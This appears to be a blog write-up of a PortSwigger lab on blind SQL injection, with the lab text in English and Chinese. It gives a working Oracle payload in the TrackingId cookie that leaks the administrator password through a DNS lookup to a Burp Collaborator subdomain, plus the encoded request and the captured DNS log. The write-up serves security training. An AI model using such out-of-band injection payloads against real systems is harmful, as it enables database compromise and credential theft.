---
layout: post
title: "Blind SQL injection with out-of-band data exfiltration"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# Blind SQL injection with out-of-band data exfiltration


```

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

#### Learning path

If you're following our [learning path](https://portswigger.net/web-security/learning-path), please note that the suggested solution for this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

#### Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).




本實驗包含一個盲 SQL 注入漏洞。該應用程序使用跟踪 cookie 進行分析，並執行包含提交的 cookie 值的 SQL 查詢。

SQL 查詢是異步執行的，對應用程序的響應沒有影響。但是，您可以觸發與外部域的帶外交互。

該數據庫包含一個名為 users 的不同表，其中包含名為 username 和 password 的列。您需要利用 SQL 盲注漏洞找出管理員用戶的密碼。

要解決實驗室問題，請以管理員用戶身份登錄。
學習路徑

如果您遵循我們的學習路徑，請注意，此實驗室的建議解決方案需要對我們尚未涵蓋的主題有所了解。如果你被卡住了，不要擔心；一旦你進一步發展了你的知識，試著稍後再回來。
筆記

為了防止 Academy 平台被用於攻擊第三方，我們的防火牆阻止了實驗室與任意外部系統之間的交互。要解決實驗室，您必須使用 Burp Collaborator 的默認公共服務器。
暗示

您可以在我們的 SQL 注入備忘單上找到一些有用的有效載荷。

```


```

TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--

```


利用data 串接 域名 帶出資料，也就是等於使用子域名去echo
```
SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">
```

BURP-COLLABORATOR-SUBDOMAIN
```
sc8fydumc5nrx3fwzj33t9fvhmncb1.burpcollaborator.net
```



```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.sc8fydumc5nrx3fwzj33t9fvhmncb1.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

```

DNS client:
```
The Collaborator server received a DNS lookup of type A for the domain name 

cblxxgakbgzi0wu0j8xe.sc8fydumc5nrx3fwzj33t9fvhmncb1.burpcollaborator.net. 


The lookup was received from IP address 3.248.186.69 at 2022-11.-09 13:51:49 UTC.

```

密碼被當成子域名帶出來。
```
cblxxgakbgzi0wu0j8xe
```


登入